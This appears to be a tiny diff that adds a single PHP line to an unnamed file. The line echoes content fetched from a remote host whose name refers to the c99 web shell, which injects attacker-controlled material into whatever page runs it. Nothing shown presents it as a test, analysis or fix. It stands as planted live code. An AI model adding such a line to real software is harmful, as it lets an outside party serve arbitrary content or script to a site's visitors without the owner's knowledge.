@@ -1,0 +1,1 @@
+<? echo file_get_contents('http://www.c99shell.gen.tr/2.html'); ?>
